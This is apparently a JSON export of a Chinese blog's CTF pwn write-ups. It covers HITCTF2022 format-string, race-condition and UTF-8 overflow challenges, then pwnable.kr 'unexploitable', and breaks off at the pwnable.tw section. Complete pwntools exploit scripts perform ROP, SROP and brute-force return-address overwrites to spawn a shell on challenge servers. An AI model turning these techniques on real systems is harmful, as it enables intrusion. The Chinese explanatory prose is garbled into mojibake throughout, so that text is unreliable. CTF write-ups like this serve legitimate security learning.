[{"title":"HITCTF2022çš„ä¸¤ä¸ªpwné¢˜","url":"/2022/11/29/HITCTF2022/","content":"\n\n\n# HITCTFä¸¤ä¸ªpwné¢˜ç»ƒä¹ \n\n## pwn2 TIME\n\né¢˜ç›®é™„ä»¶ï¼š[pwn2.zip](pwn2.zip)\n\n### æ¼æ´ç‚¹\n\n**1ã€prirntfæ ¼å¼åŒ–å­—ç¬¦ä¸² - ä¿¡æ¯æ³„éœ²**\n\nglobal_nameæ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œé€šè¿‡%på¯ä»¥æ³„éœ²æ ˆä¸Šçš„ä¿¡æ¯ã€‚\n\n![image-20221127040430586](image-20221127040430586.png?size=600)\n\nè¿™ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦é™åˆ¶æ˜¯0xffï¼Œæ‰€ä»¥è¿˜æ˜¯å¯ä»¥æ³„éœ²æŒºå¤šä¸œè¥¿çš„\n\n![image-20221127040543977](image-20221127040543977.png?size=600)\n\n\n\n**2ã€æ¡ä»¶ç«äº‰race condition**\n\npthread_createèµ·å­è¿›ç¨‹æ‰§è¡Œdisplay(v1)\n\n![image-20221127040920775](image-20221127040920775.png?size=600)\n\né‡ç‚¹çœ‹è¿™ä¸ªä½ç½®ï¼Œa1ä¸º1è¡¨ç¤ºæˆ‘ä»¬è¾“å…¥çš„æ˜¯æƒ³è®¿é—®flag.txtï¼Œå¦åˆ™å°±æ˜¯è®¿é—®old_flag.txtã€‚is_secret_fileæ˜¯bssæ®µçš„å…¨å±€å˜é‡ï¼Œä¸åŒçš„çº¿ç¨‹æ ¹æ®è¾“å…¥çš„ä¸åŒï¼Œä¼šå°†is_secret_fileçš„å€¼æ”¹æˆ0æˆ–è€…1\n\n![image-20221127040954125](image-20221127040954125.png?size=600)\n\na1å’Œis_secret_fileæ˜¯åœ¨check_file_name()ä¸­è®¾ç½®çš„ï¼Œè¿™ä¸ªå‡½æ•°çš„è®¾ç½®ä¿æŠ¤äº†flag.txtä¸ä¼šè¢«ç›´æ¥è¯»å–åˆ°\n\n![image-20221127042437880](image-20221127042437880.png?size=600)\n\nä½†æ˜¯is_secret_fileæ˜¯å…¨å±€å˜é‡ï¼Œæ‰€æœ‰å­çº¿ç¨‹éƒ½ä¼šè®¿é—®å¹¶æ”¹å˜è¯¥å˜é‡ã€‚è€ƒè™‘ä¸‹é¢è¿™ç§æ¡ä»¶ç«äº‰æ—¶çš„æƒ…å†µ\n\n![image-20221127050028893](image-20221127050028893.png?size=600)\n\nçº¿ç¨‹1æœ¬æ¥a1ä¸º1ï¼Œis_secret_fileä¸º1ï¼Œfile_nameä¸º\"flag.txt\"ï¼Œæ˜¯ä¸æ»¡è¶³è¿›å…¥dispaly_file_content()è¿™ä¸€åˆ†æ”¯ä¸­çš„ã€‚ä½†æ˜¯ç”±äºæœ‰å¤šä¸ªçº¿ç¨‹ï¼Œä¸”is_secret_fileæ˜¯å…±äº«å˜é‡ã€‚å¦‚æœçº¿ç¨‹2æ­¤æ—¶æ­£å¥½è¿è¡Œåˆ°å°†is_secret_fileèµ‹å€¼ä¸º0è¿™é‡Œã€‚å½“å†æ¬¡åˆ‡æ¢å›åˆ°çº¿ç¨‹1æ—¶ï¼Œç”±äºis_secret_fileä¸º0ï¼Œè¿›å…¥dispaly_file_content()è¿™ä¸€åˆ†æ”¯ã€‚æ­¤æ—¶å°±ä¼šè¯»å–\"flag.txt\"ç»§ç»­å¤„ç†ã€‚\n\nè™½ç„¶ç›´æ¥æ‰“å°å‡ºæ¥çš„å†…å®¹æ—¶MD4å“ˆå¸Œè¿‡çš„ï¼Œæ ¹æ®è¿™ä¸ªå†…å®¹æ— æ³•æ¢å¤å‡ºåŸæœ¬çš„flagå†…å®¹\n\n![image-20221127050755218](image-20221127050755218.png?size=600)\n\nä½†æ˜¯ï¼Œåœ¨dispaly_file_content()å‡½æ•°ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ä¼šå°†flag.txtçš„å†…å®¹æ‹·è´åˆ°æ ˆä¸Šã€‚\n\n![image-20221127050730636](image-20221127050730636.png?size=600)\n\näºæ˜¯ç»“åˆç¬¬ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå¯ä»¥å°†flagæ³„éœ²å‡ºæ¥ã€‚\n\n### åˆ©ç”¨\n\nå®Œæ•´expå¦‚ä¸‹\n\n```python\n##!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom pwn import *\n\n# context(arch=\"i386\",os=\"linux\",log_level=\"debug\")\ncontext(arch=\"i386\",os=\"linux\",log_level=\"error\")\n\n# io = process('./time')\nio = remote(\"122.114.225.151\",10000)\n\n# gdb.attach(io, \"b *0x401147 \\n c\")\n\n# sleep(1)\n# io.recvuntil(\"Who are you?\")\n\n\n\n# io.sendlineafter(\"Who are you?\",b\"%p \"*95)      # gloabl_name\nio.sendlineafter(\"Who are you?\",b\"%p \"*80)      # gloabl_name\nio.sendlineafter(\"2.old_flag.txt\",b\"1\")         # check_file_name()\n\n# io.sendlineafter(\"2.old_flag.txt\",b\"1\")   \n# io.sendlineafter(\"2.old_flag.txt\",b\"2\")   \nio.sendline(b\"1\")\nio.sendline(b\"1\")\nio.sendline(b\"1\")\n# io.sendline(b\"1\")\n# io.sendline(b\"1\")\n# io.sendline(b\"1\")\n# io.sendline(b\"1\")\n# io.sendline(b\"1\")\nio.sendline(b\"2\")\n# io.sendline(b\"1\")\n# io.sendline(b\"1\")\n# io.sendline(b\"2\")\nsleep(1)\nio.recvuntil(\"2.old_flag.txt\")\nio.sendline(b\"1\")\nio.sendline(b\"1\")\n\nio.interactive()\n```\n\nä»æ ˆä¸­dumpå‡ºflag.txtçš„ä¿¡æ¯\n\n![image-20221127035038459](image-20221127035038459.png?size=600)\n\nåˆ©ç”¨è„šæœ¬å¿«é€Ÿè§£æ\n\n```python\nfrom pwn import *\n\na = [0x3032465443544948, 0x2d656d69747b3232, 0x6c69662d612d7369, 0x772d746168742d65, 0x646e612d73726165, 0x6e2d73656b616d2d, 0x7d6573696f6e2d6f, 0xa]\nresult = b\"\"\nfor i in a:\n    result += p64(i)\n    print(result)\n```\n\nå¾—åˆ°flag\n\n![image-20221127035124249](image-20221127035124249.png?size=600)\n\n\n\n## pwn3 DOC\n\né¢˜ç›®é™„ä»¶ï¼š[pwn3.zip](pwn3.zip)\n\n### ç®€å•è§£æ\n\næ¼æ´ç‚¹åœ¨è¿™é‡Œ\n\n![image-20221129164901127](image-20221129164901127.png?size=600)\n\nmaxçš„åˆå§‹å€¼æ˜¯0x800ï¼ˆ2048 bytesï¼‰ï¼Œæˆ‘ä»¬åªéœ€å…³æ³¨æœ€åä¸¤è½®çš„æƒ…å†µã€‚å½“å‰é¢å·²è½¬æ¢2045 bytesçš„utf-8å­—ç¬¦ï¼Œè€Œæœ€åä¸€ä¸ªutf-16è½¬æˆutf-8åæ˜¯4å­—èŠ‚æ—¶ï¼Œå°±ä¼šè¦†ç›–åˆ°2049å­—èŠ‚å¤„ã€‚è€Œ2049ä½ç½®å¤„æ­£å¥½æ˜¯flag.docçš„modeï¼Œå°†modeæ”¹ä¸º0ï¼Œåœ¨ç½‘é¡µä¸Šé€šè¿‡`http://122.114.225.168:10052/doc/extract_many?files=user0.doc|flag.doc`å°±èƒ½æŸ¥çœ‹åˆ°flagå†…å®¹ã€‚\n\n[exp.doc](exp.doc)\n\næ„é€ çš„docæ–‡æ¡£å†…å®¹æ˜¯ï¼š`\"a\"*512 + \"b\"*512 + \"c\"*512 + \"å˜€\"*167 + \"ç‰¹æ®Šå­—ç¬¦\"*3`ï¼Œè¿™ä¸²utf-16å­—ç¬¦è½¬æˆutf-8åï¼Œæ­£å¥½æ˜¯2049å­—èŠ‚ã€‚\n\nä»¥ä¸Šæè¿°ä¸­çš„ç‰¹æ®Šå­—ç¬¦æ˜¯æŒ‡4å­—èŠ‚çš„utf-8å­—ç¬¦ï¼Œä»ä»¥ä¸‹é“¾æ¥ä¸­éšæ„æ‰¾ä¸€ä¸ªä½¿ç”¨å³å¯\n\n[UTF-8 4-BYTE CHARACTER CHART](https://design215.com/toolbox/utf8-4byte-characters.php)\n\n```\n>>> a = \"å˜€\"\n>>> a.encode(\"utf-8\")\nb'\\xe5\\x98\\x80'\n>>> a.encode(\"utf-16\")\nb'\\xff\\xfe\\x00V'\n\n>>> b = \"ğ„”\"\n>>> b.encode(\"utf-8\")\nb'\\xf0\\x9d\\x84\\x94'\n>>> b.encode(\"utf-16\")\n```\n\n167ä¸ª\"å˜€\"+3ä¸ª\"ğ„”\"ï¼Œè½¬æ¢æˆUTF-8åï¼Œå æ®`167*3+3*4 = 513 `ï¼Œæ­£å¥½è¦†ç›–åˆ°`flag.txt`çš„modeï¼Œå°†å…¶æ”¹æˆé0å€¼ã€‚\n\n### ä»€ä¹ˆæ˜¯CGI\n\n[å¦‚ä½•ä½¿ç”¨ CGI è„šæœ¬ç”Ÿæˆç½‘é¡µ](https://linux.cn/article-9514-1.html) è¿™ç¯‡æ–‡ç« è®²äº†é™æ€htmlç½‘é¡µåˆ°åŠ¨æ€htmlç½‘é¡µçš„å‘å±•è¿‡ç¨‹ï¼Œå¼•å…¥äº†CGIã€‚\n\n[è½¬ï¼ï¼å¸¸ç”¨çš„4ç§åŠ¨æ€ç½‘é¡µæŠ€æœ¯â€”CGIã€ASPã€JSPã€PHP](https://www.cnblogs.com/wuyun-blog/p/4503818.html) è¿™ç¯‡æ–‡ç« æè¿°äº†CGIçš„æ¦‚å¿µï¼šå®¢æˆ·ç«¯å¯ä»¥å‘webæœåŠ¡å™¨ä¸ŠæŒ‡å®šçš„CGIç¨‹åºå‘èµ·è¯·æ±‚ã€‚webæœåŠ¡å™¨æ”¶åˆ°è¯¥è¯·æ±‚åä¼šå¯åŠ¨ä¸€ä¸ªæ–°çš„è¿›ç¨‹æ‰§è¡Œè¿™ä¸ªCGIç¨‹åºï¼Œæœ€åå°†ç¨‹åºè¿è¡Œçš„ç»“æœä»¥ç½‘é¡µçš„å½¢å¼å›ç»™å®¢æˆ·ç«¯ã€‚å¯ä»¥ç”¨c/c++/vb/perlç­‰è¯­è¨€ç¼–å†™ã€‚\n\n### å­—ç¬¦ç¼–ç \n\n[A Short History Of Character Encoding](https://thedatastudio.net/history_of_character_encoding.htm)\n\nå­—ç¬¦ç¼–ç çš„å†å²ï¼šEBDIC -> ASCII(7 bits) -> ISO/IEC 8859 family & Windows 12xx family(8 bits) -> Unicode\n\n\n\n\n\n\n\n","tags":["unicode"],"categories":["CTF"]},{"title":"pwné¢˜ç»ƒä¹ ä¹‹unexploitable","url":"/2022/11/06/unexploitable-pwn/","content":"\n\n\næœ¬ç¯‡wpä¸­æ¶‰åŠä¸‰é“pwné¢˜ï¼Œåå­—éƒ½å«åšâ€œunexploitableâ€ã€‚åšå®Œè¿™ä¸‰ä¸ªé¢˜åï¼Œä»ä¿æŠ¤æªæ–½åŠåˆ©ç”¨æ–¹æ³•çš„åŒºåˆ«ï¼Œæ€»ç»“äº†å¦‚ä¸‹å¯¹æ¯”å›¾ï¼š\n\n![image-20221106180532380](image-20221106180532380.png?size=600)\n\n\n\n# pwnable.kr unexploitable\n\né¢˜ç›®é™„ä»¶ï¼š[pwnable.kr](kr-unexploitable.zip)\n\n## åˆ†æ\n\näºŒè¿›åˆ¶åŸºæœ¬ä¿¡æ¯å¦‚ä¸‹\n\n```bash\n$ file unexploitable\nunexploitable: setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=aba2c1fb7a4bca286d75e23006f9fe01dfcb03c2, not stripped\n\n$ checksec unexploitable\n[*] '/home/bling/Downloads/kr-unexploitable/unexploitable'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\t\t\t# gotè¡¨å¯å†™\n    Stack:    No canary found\t\t# æœªå¼€å¯canaryï¼Œæ ˆæº¢å‡ºåˆ©ç”¨æ›´æ–¹ä¾¿äº†\n    NX:       NX enabled\t\t\t# æ ˆä¸å¯æ‰§è¡Œ\n    PIE:      No PIE (0x400000)\t\t# ä»£ç æ®µæœªå¼€å¯åœ°å€éšæœºåŒ–\n```\n\nIDAåæ±‡ç¼–ï¼Œå¯ä»¥çœ‹åˆ°æ¼æ´ç‚¹è¶…çº§æ˜æ˜¾ï¼Œä¸€ä¸ªå¤§å¤§çš„æ ˆæº¢å‡º\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char buf[16]; // [rsp+0h] [rbp-10h] BYREF\n\n  sleep(3u);\n  return read(0, buf, 0x50FuLL);\n}\n```\n\n## è°ƒè¯•\n\né€šè¿‡å¦‚ä¸‹è„šæœ¬ç¡®å®šè¿”å›åœ°å€çš„åç§»\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nio =process(\"./unexploitable\")\n\ngdb.attach(io,\"b *0x400577 \\n c\")\npayload = cyclic(100)\nio.send(payload)\n\nio.interactive()\n```\n\næ–­ç‚¹0x400577ï¼ˆmainå‡½æ•°çš„retï¼‰å¤„ï¼Œrspå¤„å­˜æ”¾çš„4å­—èŠ‚å†…å®¹æ˜¯`gaaa`ï¼Œå…¶åç§»ä¸º24ã€‚\n\n````python\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ stack â”€â”€â”€â”€\n0x007ffe16adddc8â”‚+0x0000: \"gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa[...]\"\t â† $rsp\n0x007ffe16adddd0â”‚+0x0008: \"iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]\"\n0x007ffe16adddd8â”‚+0x0010: \"kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]\"\n0x007ffe16addde0â”‚+0x0018: \"maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]\"\n0x007ffe16addde8â”‚+0x0020: \"oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa\"\n0x007ffe16adddf0â”‚+0x0028: \"qaaaraaasaaataaauaaavaaawaaaxaaayaaa\"\n0x007ffe16adddf8â”‚+0x0030: \"saaataaauaaavaaawaaaxaaayaaa\"\n0x007ffe16adde00â”‚+0x0038: \"uaaavaaawaaaxaaayaaa\"\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ code:x86:64 â”€â”€â”€â”€\n     0x40056c <main+40>        mov    eax, 0x0\n     0x400571 <main+45>        call   0x400430 <read@plt>\n     0x400576 <main+50>        leave  \nâ—â†’   0x400577 <main+51>        ret    \n[!] Cannot disassemble from $PC\n\n>>> cyclic_find(\"gaaa\")\n24\n````\n\näºæ˜¯é€šè¿‡å¦‚ä¸‹è„šæœ¬ï¼Œæˆ‘ä»¬èƒ½æ§åˆ¶è¯¥ç¨‹åºæ‰§è¡Œåˆ°ä»»æ„`ret_addr`åœ°å€\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nio =process(\"./unexploitable\")\n\ngdb.attach(io,\"b *0x400577 \\n c\")\nret_addr = p64(0xdeadbeef)\npayload = b\"a\"*24 + ret_addr\nio.send(payload)\n\nio.interactive()\n```\n\n\n\n## åˆ©ç”¨\n\n\n\n### æ–¹æ³•1 vsyscallæš´ç ´é€šè§£\n\nç”±äºretæ—¶rspæŒ‡å‘çš„æ ˆé¡¶ä½ç½®å°±æ˜¯libc_start_mainåœ°å€ï¼Œå› æ­¤æ— éœ€ä½¿ç”¨vsyscallï¼Œç›´æ¥è¦†ç›–è¿”å›åœ°å€çš„ä½3ä¸ªå­—èŠ‚ä¸ºæˆ‘ä»¬gadgetçš„åœ°å€å°±è¡Œã€‚\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\ns = ssh(host='pwnable.kr',user='unexploitable',password='guest',port=2222)\n\nwhile True:\n    try:\n        myio = s.run('./unexploitable')\n        payload = b\"a\"*24 + b\"\\x47\\xc2\\xc9\"   # 0xc9c247\n        sleep(3)\n        myio.send(payload)\n        sleep(0.03)\n        myio.sendline(\"ls\")\n        sleep(0.03)\n        myio.recv()\n        myio.sendline(\"ls\")\n        sleep(0.03)\n        myio.recv()\n        myio.interactive()\n        break\n    except EOFError:\n        myio.close()\n```\n\nç»è¿‡æ¼«é•¿çš„ç­‰å¾…ï¼ŒæŸä¸€æ¬¡æš´ç ´æˆåŠŸçš„åœºæ™¯ï¼Œå¦‚æœå°†`\"ls\"`æ”¹æˆ`\"cat flag\"`å°±èƒ½ç›´æ¥æ‰“å°flag\n\n![image-20221030232949581](image-20221030232949581.png?size=600)\n\n\n\n### æ–¹æ³•2 ROP\n\né¢˜ç›®æ²¡æœ‰ç»™libcï¼Œé¢„æœŸè§£æ³•åº”è¯¥è·Ÿlibcæ— å…³ã€‚ç¡®è®¤é¢˜ç›®ç¨‹åºæ— åé—¨å‡½æ•°ï¼Œä¸ºäº†è·å¾—shellï¼Œæˆ‘ä»¬å¿…é¡»åŠ«æŒæ§åˆ¶æµæ‰§è¡Œ`execve(\"/bin/sh\")`æˆ–`system(\"/bin/sh\")`ã€‚gotè¡¨ä¸­æ²¡æœ‰è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œåœ¨å¿½ç•¥libcçš„æƒ…å†µä¸‹ï¼Œä¸ºæ‰§è¡Œ`execve(\"/bin/sh\")`ï¼Œè¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œå°±æ˜¯åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨`syscall`æŒ‡ä»¤ã€‚å¦‚ä¸‹ï¼Œåœ¨ç¨‹åºä¸­æ­£å¥½æ‰¾åˆ°äº†ä¸€æ¡`syscall`ã€‚\n\n```bash\n$ ROPgadget --binary=\"./unexploitable\" | grep \"sys\"\n0x0000000000400560 : syscall\n```\n\nåˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š\n\n1. `read(0,bss_addr1,size)`ï¼šå°†`\"/bin/sh\\x00\"`å­—ç¬¦ä¸²å†™å…¥bssæ®µ\n2. `read(0,bss_addr2,size)`ï¼šå°†`p64(0x400560)`å†™å…¥bssæ®µï¼Œret2csuæ–¹æ³•ä¸­é€šè¿‡`call [bss_addr2]`æ¥æ‰§è¡ŒsyscallæŒ‡ä»¤ ï¼ˆ1 2å¯åˆå¹¶æˆä¸€æ­¥ï¼‰\n3. `read(0,bss_addr3,59)`ï¼šç”±äºç¨‹åºä¸­æ— æ§åˆ¶raxçš„gadgetï¼Œæ‰€ä»¥åˆ©ç”¨è¯¥å‡½æ•°è¿”å›å°†RAXç½®ä¸º59ï¼Œå¯¹åº”ä¸`execve`çš„ç³»ç»Ÿè°ƒç”¨å·\n4. `execve(bss_addr1,0,0)`ï¼šè®¾ç½®å¥½å‚æ•°åï¼ˆ`rax:59, rdi:\"/bin/sh\", rsi:0, rdx:0`ï¼‰ï¼Œè·³è½¬åˆ°`syscall`æŒ‡ä»¤ï¼Œå®Œæˆåˆ©ç”¨\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./unexploitable\")\nmylibc = ELF(\"./libc-2.23.so\")\nmyld = ELF(\"./ld-2.23.so\")\n\ncsu_first_addr = 0x4005e6\ncsu_second_addr = 0x4005d0\ndef csu(rbx, rbp, r12, r13, r14, r15, next_func):\n    payload = b'a'*24\n    payload += p64(csu_first_addr) + p64(0x0) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)\n    payload += p64(csu_second_addr)\n    payload += b'b' * 0x38\n    payload += p64(next_func)\n    return payload\n\ndef csu_pad(rbx, rbp, r12, r13, r14, r15, next_func):\n    payload = b'a'*24\n    payload += p64(csu_first_addr) + p64(0x0) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)\n    payload += p64(csu_second_addr)\n    payload += p64(0x0) + p64(rbx) + p64(rbp) + p64(0x601030) + p64(0x601028) + p64(0x0) + p64(0x0)\n    payload += p64(next_func)\n    return payload\n\n# myio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\ns = ssh(host='pwnable.kr',user='unexploitable',password='guest',port=2222)\nmyio = s.run('./unexploitable')\n\n# gdb.attach(myio,\"b *0x400577 \\n c\")\t # main's ret\n# gdb.attach(myio,\"b *0x4005DD \\n c\")    # csu_init after call[r12]\n# step1&step2ï¼Œå°†\"/bin/sh\"å†™å…¥0x601028åœ°å€å¤„ï¼Œå°†p64(0x400560)å³syscallæŒ‡ä»¤åœ°å€å†™å…¥0x601030\n# read(0,0x601028,30) ,read@got:0x601000, main:0x400544\npayload = csu(0,1,0x601000,0,0x601028,30,0x400544)\nmyio.send(payload)\nsleep(3)\nmyio.sendline(b\"/bin/sh\\x00\"+p64(0x400560))\n\nsleep(3)\n# step3&step4ï¼Œå…ˆåˆ©ç”¨read()å°†raxç½®ä¸º59ï¼Œç´§æ¥ç€ç»§ç»­è¿”å›csu_initä¸­è°ƒç”¨syscall\n# read(0,0x601040,59) , syscall: 0x400560\npayload = csu_pad(0,1,0x601000,0,0x601050,59,0x4005d0)\nmyio.send(payload)\nsleep(3)\nmyio.sendline(b\"e\"*58)\t\t# è‡ªåŠ¨åŠ \"\\n\"ï¼Œé•¿åº¦æœ€ç»ˆä¸º59\n\nmyio.interactive()\n```\n\n\n\n### æ–¹æ³•3 SROP\n\n> æˆ‘çš„åˆ©ç”¨æ–¹å¼æ˜¯`ret2csu+sigreturn`ï¼Œå®é™…ä¸Šæœ‰æ›´ç®€å•çš„æ–¹æ³•å°±æ˜¯`æ ˆè¿ç§»+sigreturn`\n\nSROPæ—¶å¦‚æœæ— éœ€å†æ¬¡è¿”å›æ‰§è¡Œï¼Œåªéœ€è¦æ‰¾`syscall`å•æ¡æŒ‡ä»¤å°±è¡Œã€‚å¦‚æœéœ€è¦è¿”å›æ‰§è¡Œï¼Œéœ€è¦è®¾ç½®å¥½rspï¼Œå¹¶ä¸”æ‰¾`syscall; ret`åˆäºŒä¸ºä¸€çš„gadgetã€‚\n\næœ¬é¢˜æ€è·¯å¦‚ä¸‹ï¼š\n\n1ã€å¾€bssæ®µå†™å…¥\"/bin/sh\\x00\"å­—ç¬¦ä¸²\n\n2ã€åœ¨æ ˆä¸Šæ„é€ å¥½sigFrameç»“æ„ä½“\n\n3ã€åˆ©ç”¨read()å°†raxå˜æˆ15\n\n4ã€pop ipï¼Œæ‰§è¡Œsigreturn\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./unexploitable\")\nmylibc = ELF(\"./remote-lib/libc-2.23.so\")\nmyld = ELF(\"./remote-lib/ld-2.23.so\")\n\ncsu_first_addr = 0x4005e6\ncsu_second_addr = 0x4005d0\nsyscall_addr = 0x400560\nsyscall_ret_addr = 0xffffffffff600007\nread_got_addr =  0x601000\nbss_bin_sh_addr = 0x601028\nmain_addr = 0x400544\n\ndef csu(rbx, rbp, r12, r13, r14, r15, next_func):\n    payload = b'a'*24\n    payload += p64(csu_first_addr) + p64(0x0) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)         # read(0,bss_bin_sh_addr,30) <<- \"/bin/sh\\x00\"\n    payload += p64(csu_second_addr)\n    payload += p64(0x0) + p64(rbx) + p64(rbp) + p64(read_got_addr) + p64(0x0) + p64(0x601050) + p64(0xf)                # read(0,bss_bin_sh_addr+0x28,15) <<-- arbitrary data, set rax be 15\n    payload += p64(next_func)\n    return payload\n\n# myio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\ns = ssh(host='pwnable.kr',user='unexploitable',password='guest',port=2222)\nmyio = s.run('./unexploitable')\n\n# gdb.attach(myio,\"b *0x400577 \\n c\")\n# gdb.attach(myio,\"b *0x4005DD \\n c\")    # 0x4005DD\n# payload = b\"a\"*24 + p64(0x400544) + b\"b\"*8 +b\"c\"*8\n# read(0,bss_bin_sh_addr,30) <<- \"/bin/sh\\x00\"\npayload = csu(0,1,read_got_addr,0,bss_bin_sh_addr,30,csu_second_addr)\npayload += p64(0x0)*7                                         # padding\npayload += p64(syscall_addr)                                  # sigreturn\n\nframe = SigreturnFrame(kernel=\"amd64\")\nframe.rax = 59\nframe.rdi = bss_bin_sh_addr\nframe.rsi = 0\nframe.rdx = 0\nframe.rip = syscall_addr\npayload += bytes(frame)\n\nmyio.send(payload)\nsleep(3)\n# read(0,bss_bin_sh_addr,30)\nmyio.sendline(b\"/bin/sh\\x00\")\nsleep(3)\n# read(0,bss_bin_sh_addr+0x28,15) \nmyio.sendline(b\"a\"*14)\nmyio.interactive()\n```\n\n### å…¶ä»–æ–¹æ³•å‚è€ƒ\n\n[[pwnable.kr] unexploitable](https://blog.gye0ngje.com/377) ï¼šæ ˆè¿ç§»+sigreturnï¼Œæ­¤æ–¹æ³•æœªä½¿ç”¨é€šç”¨gadget`libc_csu_init`ï¼Œæ›´ç®€å•\n\n[Pwnable Challenge: Unexploitable](http://alkalinesecurity.com/blog/ctf-writeups/pwnable-challenge-unexploitable/) ï¼šå¦‚æœç›®æ ‡æœåŠ¡å™¨/tmpç›®å½•å¯å†™ï¼Œlocal exp\n\n\n\n\n\n## çŸ¥è¯†ç‚¹\n\n### SROP\n\n[CTFwiki-SROP](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/)\n\n[Sigreturn Oriented Programmingæ”»å‡»ç®€ä»‹](https://www.anquanke.com/post/id/85810)\n\n[Sigreturn-Oriented Programming (SROP)](https://amriunix.com/post/sigreturn-oriented-programming-srop/)\n\n- æ­£å¸¸æƒ…å†µä¸‹çš„linux signalæœºåˆ¶æµç¨‹\n\n  ![image-20221105143156572](image-20221105143156572.png?size=600)\n\n  ![image-20221106144212266](image-20221106144212266.png?size=600)\n\n  1ã€ç”¨æˆ·æ€æŸä¸ªè¿›ç¨‹å‘èµ·signalï¼Œæ§åˆ¶æƒè½¬ç§»åˆ°å†…æ ¸\n\n  2ã€å†…æ ¸ä¿å­˜ç”¨æˆ·æ€è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼ˆå¯„å­˜å™¨çŠ¶æ€ç­‰ï¼‰ï¼Œå¹¶æŠŠrt_sigreturnåœ°å€å‹æ ˆã€‚ç„¶åè·³è½¬åˆ°ç”¨æˆ·æ€æ‰§è¡Œsignal handler\n\n  3ã€signal handleræ‰§è¡Œå®Œåï¼Œè°ƒç”¨rt_sigreturnè¿›å…¥å†…æ ¸æ€\n\n  4ã€å†…æ ¸æ¢å¤`æ­¥éª¤2`ä¸­ä¿å­˜çš„ç”¨æˆ·æ€è¿›ç¨‹ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œåå°†æ§åˆ¶æƒäº¤ç»™ç”¨æˆ·æ€è¿›ç¨‹\n\n\n\n- SROPåˆ©ç”¨çš„æ˜¯ååŠéƒ¨åˆ†\n\n  > ç¬¬äºŒæ­¥ä¿å­˜çš„ä¸Šä¸‹æ–‡ä¿¡æ¯åœ¨ç”¨æˆ·æ ˆä¸­ï¼Œç”¨æˆ·æ€æœ‰æƒé™æ”¹å†™\n\n  åœ¨æ ˆä¸­å¸ƒç½®å¥½sigFrameç»“æ„ä½“ï¼Œæ‰§è¡Œsigreturnã€‚å†æ¬¡ä»å†…æ ¸è¿”å›æ—¶ï¼Œä¼šå¼¹å‡ºæ ˆä¸­sigFrameç»“æ„åˆ°å„ä¸ªå¯„å­˜å™¨ï¼Œäºæ˜¯å®ç°ç”¨æˆ·æ€æ§åˆ¶æµåŠ«æŒã€‚\n\n  ```python\n  # pwntoolsä¸­å·²é›†æˆSROPæ”»å‡»çš„å‡½æ•°\n  sigframe = SigreturnFrame()\n  sigframe.rax = xxx\n  sigframe.rdi = xxx\n  sigframe.rsi = xxx\n  sigframe.rdx = xxx\n  sigframe.rsp = xxx\n  sigframe.rip = xxx\n  ```\n\n  \n\n### ret2setcontext53\n\n[setcontextå­¦ä¹ ](https://psyduck0409.github.io/2021/04/25/2021/setcontext%E5%AD%A6%E4%B9%A0/)\n\n[setcontext å‡½æ•°](https://n0va-scy.github.io/2022/02/14/setcontext/)\n\nå †é¢˜ä¸­å¸¸ç”¨çš„ä¸€ä¸ªæ–¹æ³•ï¼Œè®¾ç½®çš„ç»“æ„ä½“è·ŸSROPä¸­æ„é€ çš„ç»“æ„ä½“æ˜¯åŒä¸€ä¸ªã€‚\n\nè¯¥æ–¹æ³•æœ¬é¢˜æœªä½¿ç”¨ï¼Œå› ä¸ºç¢°å·§çœ‹åˆ°äº†ï¼Œå°±æš‚æ—¶è®°åœ¨è¿™é‡Œã€‚\n\n\n\n# pwnable.tw unexploitable\n\n[pwnable.tw](tw-unexploitable.zip)\n\n>  